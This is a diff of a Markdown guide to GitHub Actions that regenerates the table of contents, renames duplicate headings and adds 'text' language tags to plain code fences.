@@ -11,14 +11,14 @@
     - [Best Practices for Local Development](#best-practices-for-local-development)
   - [Contextual Information in GitHub Workflows](#contextual-information-in-github-workflows)
     - [1. **github Context**](#1-github-context)
-      - [Key Variables in `github` Context:](#key-variables-in-github-context)
-      - [Example Usage:](#example-usage)
+      - [Key Variables in `github` Context](#key-variables-in-github-context)
+      - [Example Usage](#example-usage)
     - [2. **env Context**](#2-env-context)
     - [3. **secrets Context**](#3-secrets-context)
     - [4. **job Context**](#4-job-context)
-      - [Example:](#example)
+      - [Example](#example)
     - [5. **runner Context**](#5-runner-context)
-      - [Example:](#example-1)
+      - [Example — Runner Information](#example--runner-information)
     - [6. **steps Context**](#6-steps-context)
     - [7. **matrix Context**](#7-matrix-context)
     - [8. **inputs Context**](#8-inputs-context)
@@ -36,16 +36,19 @@
       - [Example 3: Using Contexts at Step Level](#example-3-using-contexts-at-step-level)
       - [Example 4: Cross-Job Context Usage with needs](#example-4-cross-job-context-usage-with-needs)
     - [Important Notes on Context Availability](#important-notes-on-context-availability)
+    - [2. Limited Context in Dynamic Action Selection](#2-limited-context-in-dynamic-action-selection)
+    - [5. Static vs Runtime Expression Evaluation](#5-static-vs-runtime-expression-evaluation)
+    - [6. Secret Leakage Prevention in Expressions](#6-secret-leakage-prevention-in-expressions)
   - [GitHub Workflow File Structure](#github-workflow-file-structure)
     - [1. **Basic Structure**](#1-basic-structure)
     - [2. **name**](#2-name)
     - [3. **on** (Events)](#3-on-events)
-      - [Common Trigger Events:](#common-trigger-events)
+      - [Common Trigger Events](#common-trigger-events)
     - [4. **env**](#4-env)
     - [5. **defaults**](#5-defaults)
     - [6. **concurrency**](#6-concurrency)
     - [7. **jobs**](#7-jobs)
-      - [Job Properties:](#job-properties)
+      - [Job Properties](#job-properties)
         - [**name**](#name)
         - [**runs-on**](#runs-on)
         - [**environment**](#environment)
@@ -54,13 +57,13 @@
         - [**if**](#if)
         - [**steps**](#steps)
     - [8. **Steps**](#8-steps)
-      - [Step Properties:](#step-properties)
-        - [**name**](#name-1)
+      - [Step Properties](#step-properties)
+        - [**name** — Step Property](#name--step-property)
         - [**uses**](#uses)
         - [**run**](#run)
         - [**with**](#with)
         - [**env**](#env)
-        - [**if**](#if-1)
+        - [**if** — Step Condition](#if--step-condition)
         - [**id**](#id)
         - [**timeout-minutes**](#timeout-minutes)
         - [**continue-on-error**](#continue-on-error)
@@ -75,7 +78,7 @@
       - [Practical Example](#practical-example)
     - [2. **pull_request** - Pull Request Event](#2-pull_request---pull-request-event)
       - [PR Event Types](#pr-event-types)
-      - [Practical Example](#practical-example-1)
+      - [Practical Example — Pull Request Checks](#practical-example--pull-request-checks)
     - [3. **pull_request_target** - PR Target Event](#3-pull_request_target---pr-target-event)
     - [4. **workflow_dispatch** - Manual Trigger](#4-workflow_dispatch---manual-trigger)
       - [Input Types](#input-types)
@@ -144,7 +147,7 @@
       - [Use Case: Creating Unique Build Identifiers](#use-case-creating-unique-build-identifiers)
     - [2. **Repository and Reference Information**](#2-repository-and-reference-information)
       - [Repository Variables](#repository-variables)
-      - [Output Example](#output-example-1)
+      - [Output Example — Context Variables](#output-example--context-variables)
       - [Use Case: Building Docker Images with Semantic Tags](#use-case-building-docker-images-with-semantic-tags)
     - [3. **Branch and Pull Request Information**](#3-branch-and-pull-request-information)
       - [Pull Request Variables](#pull-request-variables)
@@ -160,7 +163,7 @@
     - [6. **GitHub API and Token Variables**](#6-github-api-and-token-variables)
       - [API and Token Variables](#api-and-token-variables)
       - [URLs Example](#urls-example)
-      - [Output Example](#output-example-2)
+      - [Output Example — GitHub API URLs](#output-example--github-api-urls)
     - [7. **Event Payload Information**](#7-event-payload-information)
       - [Event Payload Access](#event-payload-access)
       - [Use Case: Extract Commit Message](#use-case-extract-commit-message)
@@ -181,6 +184,8 @@
       - [Example: Multi-Reviewer Approval Process](#example-multi-reviewer-approval-process)
     - [2. **Deployment Branches**](#2-deployment-branches)
       - [Configuration Options](#configuration-options)
+        - [Protected Branches Only](#protected-branches-only)
+        - [Specific Branches](#specific-branches)
       - [Example Workflow](#example-workflow)
       - [Use Case: Different Strategies for Different Branches](#use-case-different-strategies-for-different-branches)
     - [3. **Wait Timer**](#3-wait-timer)
@@ -225,8 +230,8 @@
       - [Artifact with Metadata](#artifact-with-metadata)
     - [6. **Using Artifacts for Releases**](#6-using-artifacts-for-releases)
     - [7. **Best Practices for Artifacts**](#7-best-practices-for-artifacts)
-      - [✓ Recommended Practices](#-recommended-practices-1)
-      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-1)
+      - [✓ Recommended Practices — Artifacts](#-recommended-practices--artifacts)
+      - [✗ Anti-Patterns to Avoid — Artifacts](#-anti-patterns-to-avoid--artifacts)
     - [8. **Troubleshooting Artifacts**](#8-troubleshooting-artifacts)
       - [Artifact Not Found](#artifact-not-found)
       - [Storage Quota Exceeded](#storage-quota-exceeded)
@@ -252,8 +257,8 @@
       - [Cache with Conditional Logic](#cache-with-conditional-logic)
       - [Clearing Cache When Needed](#clearing-cache-when-needed)
     - [6. **Caching Best Practices**](#6-caching-best-practices)
-      - [✓ Recommended Practices](#-recommended-practices-2)
-      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-2)
+      - [✓ Recommended Practices — Caching](#-recommended-practices--caching)
+      - [✗ Anti-Patterns to Avoid — Caching](#-anti-patterns-to-avoid--caching)
     - [7. **Troubleshooting Caching**](#7-troubleshooting-caching)
       - [Cache Not Being Used](#cache-not-being-used)
       - [Cache Size Growing Too Large](#cache-size-growing-too-large)
@@ -272,8 +277,8 @@
     - [4. **Creating Shared Actions**](#4-creating-shared-actions)
       - [Composite Action Example](#composite-action-example)
     - [5. **Best Practices for Workflow Sharing**](#5-best-practices-for-workflow-sharing)
-      - [✓ Recommended Practices](#-recommended-practices-3)
-      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-3)
+      - [✓ Recommended Practices — Workflow Sharing](#-recommended-practices--workflow-sharing)
+      - [✗ Anti-Patterns to Avoid — Workflow Sharing](#-anti-patterns-to-avoid--workflow-sharing)
     - [6. **Starter Workflows**](#6-starter-workflows)
       - [Creating an Organization Starter Workflow](#creating-an-organization-starter-workflow)
       - [Template Placeholder Variables](#template-placeholder-variables)
@@ -307,8 +312,8 @@
       - [File Not Found Error](#file-not-found-error)
       - [Environment Variable Issues](#environment-variable-issues)
     - [7. **Best Practices for Debugging**](#7-best-practices-for-debugging)
-      - [✓ Recommended Practices](#-recommended-practices-4)
-      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-4)
+      - [✓ Recommended Practices](#-recommended-practices-1)
+      - [✗ Anti-Patterns to Avoid — Runner Debugging](#-anti-patterns-to-avoid--runner-debugging)
     - [8. **Advanced Debugging Techniques**](#8-advanced-debugging-techniques)
       - [Real-time Log Streaming](#real-time-log-streaming)
       - [Conditional Debugging](#conditional-debugging)
@@ -321,7 +326,8 @@
       - [Using in a Script](#using-in-a-script)
     - [2. **Get Workflow Details**](#2-get-workflow-details)
     - [3. **List Workflow Runs**](#3-list-workflow-runs)
-      - [Query Parameters:](#query-parameters)
+      - [Example: Get Recent Failed Runs](#example-get-recent-failed-runs)
+      - [Query Parameters](#query-parameters)
     - [4. **Get Workflow Run Details**](#4-get-workflow-run-details)
       - [Complete Python Example](#complete-python-example)
     - [5. **Trigger Workflow (workflow_dispatch)**](#5-trigger-workflow-workflow_dispatch)
@@ -336,8 +342,8 @@
     - [11. **List Artifacts**](#11-list-artifacts)
       - [Clean Up Old Artifacts](#clean-up-old-artifacts)
     - [12. **Best Practices for REST API Usage**](#12-best-practices-for-rest-api-usage)
-      - [✓ Recommended Practices](#-recommended-practices-5)
-      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-5)
+      - [✓ Recommended Practices — REST API Usage](#-recommended-practices--rest-api-usage)
+      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-1)
     - [13. **API Rate Limits and Quotas**](#13-api-rate-limits-and-quotas)
       - [Check Rate Limit Status](#check-rate-limit-status)
       - [Handle Rate Limit Errors](#handle-rate-limit-errors)
@@ -352,20 +358,22 @@
       - [Step 3: Reviewer Action](#step-3-reviewer-action)
     - [3. **Complete Deployment Review Workflow**](#3-complete-deployment-review-workflow)
     - [4. **Reviewing Deployment Best Practices**](#4-reviewing-deployment-best-practices)
-      - [✓ Recommended Practices](#-recommended-practices-6)
-      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-6)
+      - [✓ Recommended Practices](#-recommended-practices-2)
+      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-2)
     - [5. **Monitoring Reviewed Deployments**](#5-monitoring-reviewed-deployments)
   - [Creating and Publishing Actions](#creating-and-publishing-actions)
     - [What are GitHub Actions?](#what-are-github-actions)
     - [Why Create Custom Actions?](#why-create-custom-actions)
     - [How Actions Work](#how-actions-work)
     - [1. **Creating a JavaScript Action**](#1-creating-a-javascript-action)
+      - [package.json](#packagejson)
     - [2. **Using Your JavaScript Action**](#2-using-your-javascript-action)
     - [3. **Creating a Composite Action**](#3-creating-a-composite-action)
     - [4. **Publishing Action to Marketplace**](#4-publishing-action-to-marketplace)
+      - [README.md Template](#readmemd-template)
   - [Inputs](#inputs)
   - [Outputs](#outputs-1)
-  - [Example](#example-2)
+  - [Example](#example-1)
   - [License](#license)
     - [4. **Action Versioning \& Release Strategies**](#4-action-versioning--release-strategies)
       - [Semantic Versioning for Actions](#semantic-versioning-for-actions)
@@ -374,6 +382,7 @@
       - [Deprecation and Migration Guide](#deprecation-and-migration-guide)
     - [After (v2)](#after-v2)
   - [Support Timeline](#support-timeline)
+    - [Publishing Release Notes](#publishing-release-notes)
     - [4.5 **Action Distribution Models**](#45-action-distribution-models)
       - [Distribution Models Comparison](#distribution-models-comparison)
       - [Public Repository Model](#public-repository-model)
@@ -383,8 +392,8 @@
       - [Comparison: When to Use Each Model](#comparison-when-to-use-each-model)
       - [Migration Path Example](#migration-path-example)
     - [5. **Best Practices for Actions**](#5-best-practices-for-actions)
-      - [✓ Recommended Practices](#-recommended-practices-7)
-      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-7)
+      - [✓ Recommended Practices](#-recommended-practices-3)
+      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-3)
     - [6. **Debugging and Troubleshooting Actions**](#6-debugging-and-troubleshooting-actions)
       - [Enabling Debug Logging](#enabling-debug-logging-1)
       - [Debugging JavaScript Actions](#debugging-javascript-actions)
@@ -408,8 +417,8 @@
     - [6. **Scaling and Monitoring Runners**](#6-scaling-and-monitoring-runners)
     - [7. **Runner Maintenance and Updates**](#7-runner-maintenance-and-updates)
     - [8. **Best Practices for Runner Management**](#8-best-practices-for-runner-management)
-      - [✓ Recommended Practices](#-recommended-practices-8)
-      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-8)
+      - [✓ Recommended Practices](#-recommended-practices-4)
+      - [✗ Anti-Patterns to Avoid](#-anti-patterns-to-avoid-4)
   - [GitHub Actions for the Enterprise](#github-actions-for-the-enterprise)
     - [Overview](#overview)
     - [1. **Organizational Use Policies**](#1-organizational-use-policies)
@@ -443,53 +452,54 @@
       - [Trust Assessment Workflow](#trust-assessment-workflow)
       - [Real-World Assessment Example](#real-world-assessment-example)
       - [Trustworthy Action Examples](#trustworthy-action-examples)
+      - [Alternative: Custom Action Policy](#alternative-custom-action-policy)
       - [Pinning Strategy by Trust Tier](#pinning-strategy-by-trust-tier)
     - [6. **Artifact Attestations and SLSA Provenance**](#6-artifact-attestations-and-slsa-provenance)
     - [7. **Dependency Policy: Caching and Artifact Retention**](#7-dependency-policy-caching-and-artifact-retention)
   - [Common Failures and Troubleshooting](#common-failures-and-troubleshooting)
     - [1. **Authentication Errors**](#1-authentication-errors)
       - [Problem: Permission Denied](#problem-permission-denied)
-      - [Causes:](#causes)
-      - [Solutions:](#solutions)
+      - [Causes — Authentication Errors](#causes--authentication-errors)
+      - [Solutions — Authentication Errors](#solutions--authentication-errors)
     - [2. **Dependency Installation Failures**](#2-dependency-installation-failures)
       - [Problem: `npm ci` fails with version conflicts](#problem-npm-ci-fails-with-version-conflicts)
-      - [Causes:](#causes-1)
-      - [Solutions:](#solutions-1)
+      - [Causes — Dependency Installation](#causes--dependency-installation)
+      - [Solutions — Dependency Installation](#solutions--dependency-installation)
     - [3. **Timeout Errors**](#3-timeout-errors)
       - [Problem: Job times out](#problem-job-times-out)
-      - [Causes:](#causes-2)
-      - [Solutions:](#solutions-2)
+      - [Causes — Job Timeout](#causes--job-timeout)
+      - [Solutions — Job Timeout](#solutions--job-timeout)
     - [4. **Workflow File Syntax Errors**](#4-workflow-file-syntax-errors)
       - [Problem: Workflow doesn't trigger or shows validation error](#problem-workflow-doesnt-trigger-or-shows-validation-error)
-      - [Causes:](#causes-3)
-      - [Solutions:](#solutions-3)
+      - [Causes — Workflow Syntax Errors](#causes--workflow-syntax-errors)
+      - [Solutions — Workflow Syntax Errors](#solutions--workflow-syntax-errors)
     - [5. **Runner Issues**](#5-runner-issues)
       - [Problem: `ubuntu-latest` runner has outdated software](#problem-ubuntu-latest-runner-has-outdated-software)
-      - [Causes:](#causes-4)
-      - [Solutions:](#solutions-4)
+      - [Causes — Runner Outdated Software](#causes--runner-outdated-software)
+      - [Solutions — Runner Outdated Software](#solutions--runner-outdated-software)
       - [Problem: Self-hosted runner is offline or not picking up jobs](#problem-self-hosted-runner-is-offline-or-not-picking-up-jobs)
       - [Problem: Jobs are queued but no runner picks them up (label mismatch)](#problem-jobs-are-queued-but-no-runner-picks-them-up-label-mismatch)
       - [Problem: Self-hosted runner fails with permission errors or environment issues](#problem-self-hosted-runner-fails-with-permission-errors-or-environment-issues)
     - [6. **Artifact and Caching Issues**](#6-artifact-and-caching-issues)
       - [Problem: Artifact not found when downloading](#problem-artifact-not-found-when-downloading)
-      - [Causes:](#causes-5)
-      - [Solutions:](#solutions-5)
+      - [Causes — Artifact Download](#causes--artifact-download)
+      - [Solutions — Artifact Download](#solutions--artifact-download)
     - [7. **Matrix Build Failures**](#7-matrix-build-failures)
       - [Problem: One matrix combination fails and stops all others](#problem-one-matrix-combination-fails-and-stops-all-others)
-      - [Causes:](#causes-6)
-      - [Solutions:](#solutions-6)
+      - [Causes — Matrix Build](#causes--matrix-build)
+      - [Solutions — Matrix Build](#solutions--matrix-build)
     - [8. **Secret Management Issues**](#8-secret-management-issues)
       - [Problem: Secret is redacted/not available](#problem-secret-is-redactednot-available)
-      - [Causes:](#causes-7)
-      - [Solutions:](#solutions-7)
+      - [Causes — Secret Management](#causes--secret-management)
+      - [Solutions — Secret Management](#solutions--secret-management)
     - [9. **Step Output Issues**](#9-step-output-issues)
       - [Problem: Cannot reference step output in next step](#problem-cannot-reference-step-output-in-next-step)
-      - [Causes:](#causes-8)
-      - [Solutions:](#solutions-8)
+      - [Causes — Step Output](#causes--step-output)
+      - [Solutions — Step Output](#solutions--step-output)
     - [10. **Performance Issues**](#10-performance-issues)
       - [Problem: Workflows run slowly](#problem-workflows-run-slowly)
-      - [Causes:](#causes-9)
-      - [Solutions: Parallelization](#solutions-parallelization)
+      - [Causes — Performance](#causes--performance)
+      - [Solutions — Performance](#solutions--performance)
       - [Solutions: Dependency Caching](#solutions-dependency-caching)
       - [Solutions: Matrix Sizing and Concurrency Control](#solutions-matrix-sizing-and-concurrency-control)
       - [Solutions: Identifying Bottlenecks](#solutions-identifying-bottlenecks)
@@ -497,12 +507,12 @@
       - [Recommended Strategies for Scaling and Optimizing Workflows](#recommended-strategies-for-scaling-and-optimizing-workflows)
     - [11. **Docker and Container Issues**](#11-docker-and-container-issues)
       - [Problem: Docker image push fails](#problem-docker-image-push-fails)
-      - [Causes:](#causes-10)
-      - [Solutions:](#solutions-9)
+      - [Causes — Docker Push](#causes--docker-push)
+      - [Solutions — Docker Push](#solutions--docker-push)
     - [12. **Notification and Rollback Issues**](#12-notification-and-rollback-issues)
       - [Problem: Notifications fail silently](#problem-notifications-fail-silently)
-      - [Causes:](#causes-11)
-      - [Solutions:](#solutions-10)
+      - [Causes — Notification Failure](#causes--notification-failure)
+      - [Solutions — Notification Failure](#solutions--notification-failure)
     - [13. **Quick Troubleshooting Checklist**](#13-quick-troubleshooting-checklist)
   - [Additional Resources](#additional-resources)
 
@@ -546,7 +556,7 @@ code --list-extensions | grep -i github
 
 ### Using Context IntelliSense
 
-**Example: Typing `${{ ` triggers context suggestions:**
+**Example: Typing `${{` triggers context suggestions**
 
 ```yaml
 jobs:
@@ -620,7 +630,7 @@ GitHub provides rich contextual information through **contexts** that you can us
 
 The `github` context contains information about the workflow run and the event that triggered it.
 
-#### Key Variables in `github` Context:
+#### Key Variables in `github` Context
 
 | Variable                  | Description                                                                      | Example                                          |
 | ------------------------- | -------------------------------------------------------------------------------- | ------------------------------------------------ |
@@ -641,7 +651,7 @@ The `github` context contains information about the workflow run and the event t
 | `github.token`            | A token to authenticate on behalf of the GitHub App installed on your repository | (automatically provided)                         |
 | `github.workflow`         | The name of the workflow                                                         | `CI`                                             |
 
-#### Example Usage:
+#### Example Usage
 
 ```yaml
 name: Context Example
@@ -722,7 +732,7 @@ The `job` context contains information about the currently executing job.
 | `job.services`  | The services created for a job in a workflow                                 |
 | `job.status`    | The current status of the job (`success`, `failure`, `cancelled`, `skipped`) |
 
-#### Example:
+#### Example
 
 ```yaml
 name: Job Status Example
@@ -752,7 +762,7 @@ The `runner` context contains information about the runner that is executing the
 | `runner.tool_cache` | The path of the directory containing preinstalled tools for GitHub-hosted runners | `/opt/hostedtoolcache`      |
 | `runner.workspace`  | The path of the workspace directory                                               | `/home/runner/work`         |
 
-#### Example:
+#### Example — Runner Information
 
 ```yaml
 name: Runner Information
@@ -1079,7 +1089,7 @@ Secrets are never available at certain levels to prevent accidental exposure:
 - Not available in `uses` (action selection)
 - Always redacted in logs if accidentally output
 
-**2. Limited Context in Dynamic Action Selection**
+### 2. Limited Context in Dynamic Action Selection
 
 ```yaml
 # ❌ This will NOT work as expected
@@ -1122,7 +1132,7 @@ jobs:
       - run: echo ${{ needs.job1.outputs.value }}
 ```
 
-**5. Static vs Runtime Expression Evaluation**
+### 5. Static vs Runtime Expression Evaluation
 
 GitHub Actions evaluates expressions in two phases:
 
@@ -1148,7 +1158,7 @@ steps:
       MY_TOKEN: ${{ secrets.GH_TOKEN }}
 ```
 
-**6. Secret Leakage Prevention in Expressions**
+### 6. Secret Leakage Prevention in Expressions
 
 Secrets are automatically masked in logs, but certain patterns can still expose them:
 
@@ -1217,7 +1227,7 @@ name: CI/CD Pipeline
 
 Specifies the events that trigger the workflow. Can be a single event or multiple events.
 
-#### Common Trigger Events:
+#### Common Trigger Events
 
 ```yaml
 # Single event
@@ -1311,7 +1321,7 @@ jobs:
       - run: npm test
 ```
 
-#### Job Properties:
+#### Job Properties
 
 ##### **name**
 
@@ -1602,9 +1612,9 @@ steps:
 
 Steps are individual tasks that run sequentially within a job. Each step can run a script or an action.
 
-#### Step Properties:
+#### Step Properties
 
-##### **name**
+##### **name** — Step Property
 
 The name of the step.
 
@@ -1657,7 +1667,7 @@ Environment variables specific to this step.
   run: ./deploy.sh
 ```
 
-##### **if**
+##### **if** — Step Condition
 
 Conditional execution of a step.
 
@@ -2255,7 +2265,7 @@ on:
 | `review_requested`       | Review requested                 |
 | `review_request_removed` | Review request removed           |
 
-#### Practical Example
+#### Practical Example — Pull Request Checks
 
 ```yaml
 name: Pull Request Checks
@@ -2373,7 +2383,7 @@ jobs:
 
 #### Cron Syntax Reference
 
-```
+```text
 ┌───────────── minute (0 - 59)
 │ ┌───────────── hour (0 - 23)
 │ │ ┌───────────── day of month (1 - 31)
@@ -3572,7 +3582,7 @@ jobs:
 
 #### Output Example
 
-```
+```text
 Workflow: CI Pipeline
 Run ID: 1234567890
 Run Number: 42
@@ -3615,9 +3625,9 @@ jobs:
           echo "Server URL: $GITHUB_SERVER_URL"
 ```
 
-#### Output Example
+#### Output Example — Context Variables
 
-```
+```text
 Repository: octocat/Hello-World
 Repository Owner: octocat
 Ref: refs/heads/main
@@ -3712,7 +3722,7 @@ jobs:
 
 #### Output Example (Ubuntu)
 
-```
+```text
 Workspace: /home/runner/work/repo/repo
 Temp: /home/runner/_temp
 Tool Cache: /opt/hostedtoolcache
@@ -3763,7 +3773,7 @@ jobs:
 
 **On Ubuntu:**
 
-```
+```text
 Runner OS: Linux
 Runner Architecture: X64
 Runner Name: GitHub Actions 1
@@ -3771,7 +3781,7 @@ Runner Name: GitHub Actions 1
 
 **On Windows:**
 
-```
+```text
 Runner OS: Windows
 Runner Architecture: X64
 Runner Name: GitHub Actions 2
@@ -3779,7 +3789,7 @@ Runner Name: GitHub Actions 2
 
 **On macOS:**
 
-```
+```text
 Runner OS: macOS
 Runner Architecture: X64
 Runner Name: GitHub Actions 3
@@ -3835,9 +3845,9 @@ jobs:
     echo "Server URL: $GITHUB_SERVER_URL"
 ```
 
-#### Output Example
+#### Output Example — GitHub API URLs
 
-```
+```text
 API URL: https://api.github.com
 GraphQL URL: https://api.github.com/graphql
 Server URL: https://github.com
@@ -4174,15 +4184,15 @@ Restrict which branches can deploy to a specific environment.
 
 #### Configuration Options
 
-**Protected Branches Only**
+##### Protected Branches Only
 
-```
+```text
 Only allow deployments from protected branches
 ```
 
-**Specific Branches**
+##### Specific Branches
 
-```
+```text
 main
 release/*
 prodaction/*
@@ -5205,7 +5215,7 @@ jobs:
 
 ### 7. **Best Practices for Artifacts**
 
-#### ✓ Recommended Practices
+#### ✓ Recommended Practices — Artifacts
 
 ```yaml
 # ✓ Use descriptive artifact names
@@ -5250,7 +5260,7 @@ jobs:
     path: ./deploy-package/
 ```
 
-#### ✗ Anti-Patterns to Avoid
+#### ✗ Anti-Patterns to Avoid — Artifacts
 
 ```yaml
 # ✗ Don't upload entire workspace
@@ -5377,7 +5387,7 @@ Workflow caching is a mechanism that stores files and directories during a workf
 
 **Real-World Impact Example:**
 
-```
+```text
 Without Caching:
 - Install dependencies: 3-5 minutes
 - Build: 2 minutes
@@ -5440,7 +5450,7 @@ jobs:
 
 #### How This Works
 
-```
+```text
 First Run:
 - Cache key: ubuntu-npm-abc123def456
 - Key not found in cache
@@ -5660,7 +5670,7 @@ gh actions-cache list --repo OWNER/REPO --branch BRANCH | \
 
 ### 6. **Caching Best Practices**
 
-#### ✓ Recommended Practices
+#### ✓ Recommended Practices — Caching
 
 ```yaml
 # ✓ Use hashFiles for cache keys based on lock files
@@ -5688,7 +5698,7 @@ gh actions-cache list --repo OWNER/REPO --branch BRANCH | \
   run: npm ci
 ```
 
-#### ✗ Anti-Patterns to Avoid
+#### ✗ Anti-Patterns to Avoid — Caching
 
 ```yaml
 # ✗ Don't cache entire repository
@@ -5757,7 +5767,7 @@ Workflow sharing allows you to reuse workflow files across multiple repositories
 
 **Real-World Scenario:**
 
-```
+```text
 Scenario: Organization with 50 repositories
 
 Without Sharing:
@@ -5934,7 +5944,7 @@ jobs:
 
 **Complete three-layer output chain:**
 
-```
+```text
 Step output          →   Job output              →   Workflow output         →  Caller
 echo "x=v" >>             jobs.<id>.outputs:          workflow_call.outputs:    needs.<job>.outputs.
 $GITHUB_OUTPUT            key: ${{ steps.<id>         key:                      key
@@ -6156,7 +6166,7 @@ jobs:
 
 ### 5. **Best Practices for Workflow Sharing**
 
-#### ✓ Recommended Practices
+#### ✓ Recommended Practices — Workflow Sharing
 
 ```yaml
 # ✓ Version your reusable workflows
@@ -6186,7 +6196,7 @@ test-python.yml
 # README.md in shared-workflows repository with examples
 ```
 
-#### ✗ Anti-Patterns to Avoid
+#### ✗ Anti-Patterns to Avoid — Workflow Sharing
 
 ```yaml
 # ✗ Don't use workflows from untrusted sources
@@ -6380,7 +6390,7 @@ Understanding who can see and use non-public (private/internal) org workflow tem
 
 **Granting access to non-public templates:**
 
-```
+```text
 Organization Settings → Member privileges → Base permissions
   └─ Set to "Read" so all members can see the .github repo templates
 
@@ -6398,7 +6408,7 @@ A user can discover and **initiate** a template copy if they can see the `.githu
 
 On **GitHub Enterprise Cloud**, setting the `.github` repo visibility to **Internal** is the recommended approach for org-wide templates that all enterprise members should access without making them fully public:
 
-```
+```text
 .github repo visibility: Internal
 → Visible to all enterprise members regardless of org membership
 → Not visible to external collaborators or the public
@@ -6411,7 +6421,7 @@ On **GitHub Enterprise Server**, the same internal visibility model applies with
 
 GitHub does not natively restrict which target repos can copy a specific template (all or nothing per `.github` repo visibility). For fine-grained control, split templates across separate template repositories and apply access controls per repository. A common pattern:
 
-```
+```text
 {org}/.github                    → public templates (base scaffold)
 {org}/.github-internal           → internal/compliance templates (restricted team access)
 {org}/.github-security           → security team templates (security team only)
@@ -6468,13 +6478,13 @@ Embed a live status badge in your README or other Markdown files to show whether
 
 **Badge URL format:**
 
-```
+```text
 https://github.com/{OWNER}/{REPO}/actions/workflows/{WORKFLOW_FILE}/badge.svg
 ```
 
 **Branch-specific badge** (defaults to the default branch):
 
-```
+```text
 https://github.com/{OWNER}/{REPO}/actions/workflows/{WORKFLOW_FILE}/badge.svg?branch=main
 ```
 
@@ -6526,7 +6536,7 @@ Workflow debugging is the process of identifying and fixing issues in GitHub Act
 
 **Via GitHub Web UI:**
 
-```
+```text
 1. Navigate to Repository → Actions tab
 2. Click on specific workflow run
 3. View logs for each job and step
@@ -6535,7 +6545,7 @@ Workflow debugging is the process of identifying and fixing issues in GitHub Act
 
 **Log Levels:**
 
-```
+```text
 [INFO] Standard information messages
 [WARNING] Potential issues
 [ERROR] Error conditions
@@ -6779,7 +6789,7 @@ Generated job names will be:
 
 **Selective Rerun via UI:**
 
-```
+```text
 1. Go to "Actions" tab
 2. Click workflow run that had failures
 3. Under "Jobs" section, each matrix combination is listed separately
@@ -7067,7 +7077,7 @@ jobs:
   run: npm test
 ```
 
-#### ✗ Anti-Patterns to Avoid
+#### ✗ Anti-Patterns to Avoid — Runner Debugging
 
 ```yaml
 # ✗ Don't expose secrets in debug output
@@ -7168,7 +7178,7 @@ The GitHub Workflows REST API is a set of HTTP endpoints provided by GitHub that
 
 **Real-World Applications:**
 
-```
+```text
 Scenario 1: Trigger deployment on external event
 - External monitoring system detects issue
 - Calls GitHub API to trigger deployment workflow
@@ -7197,13 +7207,13 @@ All API requests require authentication using:
 
 **Base URL:**
 
-```
+```text
 https://api.github.com
 ```
 
 **Endpoint Format:**
 
-```
+```text
 GET /repos/{owner}/{repo}/actions/workflows
 GET /repos/{owner}/{repo}/actions/runs
 GET /repos/{owner}/{repo}/actions/runs/{run_id}
@@ -7307,7 +7317,7 @@ curl -H "Authorization: token YOUR_TOKEN" \
 
 **What it does**: List all workflow runs (executions) in a repository
 
-**Example: Get Recent Failed Runs**
+#### Example: Get Recent Failed Runs
 
 ```bash
 curl -H "Authorization: token YOUR_TOKEN" \
@@ -7347,7 +7357,7 @@ curl -H "Authorization: token YOUR_TOKEN" \
 }
 ```
 
-#### Query Parameters:
+#### Query Parameters
 
 | Parameter    | Values                                                   | Description                  |
 | ------------ | -------------------------------------------------------- | ---------------------------- |
@@ -7696,7 +7706,7 @@ done
 
 ### 12. **Best Practices for REST API Usage**
 
-#### ✓ Recommended Practices
+#### ✓ Recommended Practices — REST API Usage
 
 ```bash
 # ✓ Always use authentication
@@ -7887,7 +7897,7 @@ jobs:
 
 When workflow reaches a protected environment step:
 
-```
+```text
 ✓ Checkout
 ✓ Tests passed
 ✓ Build successful
@@ -7900,7 +7910,7 @@ When workflow reaches a protected environment step:
 
 **Reviewer's Perspective:**
 
-```
+```text
 GitHub Actions > Your Workflow > Review Deployment
 
 Deployment Details:
@@ -8204,7 +8214,7 @@ GitHub Actions are reusable units of code that perform specific tasks. You can c
 
 **Project Structure:**
 
-```
+```text
 my-action/
 ├── action.yml           # Action metadata
 ├── package.json         # Node.js dependencies
@@ -8337,7 +8347,7 @@ async function run() {
 run();
 ```
 
-**package.json**
+#### package.json
 
 ```json
 {
@@ -8469,7 +8479,7 @@ runs:
   ✓ Add action.yml to repository root
 ```
 
-**README.md Template**
+#### README.md Template
 
 ````markdown
 # Deploy App Action
@@ -8533,7 +8543,9 @@ jobs:
 
 MIT
 
-````
+```text
+
+```
 
 **Release and Version Management**
 
@@ -8549,7 +8561,7 @@ git push origin v1.0.0
 # Update major version tag to point to latest minor/patch
 git tag -fa v1 -m "Update v1 to latest"
 git push origin v1 --force
-````
+```
 
 ### 4. **Action Versioning & Release Strategies**
 
@@ -8557,7 +8569,7 @@ git push origin v1 --force
 
 GitHub Actions uses **semantic versioning** (MAJOR.MINOR.PATCH):
 
-```
+```text
 v1.0.0 → v1.1.0 → v1.2.0 (patch/minor bumps)
 v1.x.x → v2.0.0 (major version bump)
 ```
@@ -8695,7 +8707,9 @@ inputs:
 - v1 support ends: December 31, 2025
 - v2 is recommended for all new workflows
 
-````
+```text
+
+```
 
 #### Publishing Release Notes
 
@@ -8705,27 +8719,32 @@ Effective release notes guide users on when to upgrade:
 # v1.2.0 - New Features and Improvements
 
 ## What's New
+
 - 🎉 Added support for multiple registries (GitHub Container Registry + Docker Hub)
 - ✨ `registry-select` input allows choosing target registry
 - ⚡ 25% faster image push with parallel uploads
 - 🔧 Support for custom Dockerfile names via `dockerfile-path` input
 
 ## Bug Fixes
+
 - Fixed issue where special characters in image names caused failures
 - Corrected permission error when pushing to registry
 
 ## Backward Compatible
+
 - All v1.x.x consumers unaffected
 - Optional new inputs: `registry-select`, `dockerfile-path`
 - Update to v1.2.0 when ready, or stay on v1.1.x
 
 ## Upgrade Path
+
 For most users: `uses: org/action@v1` (auto-receives this update)
 To opt out: Pin to `uses: org/action@v1.1.5`
 
 ## Contributors
+
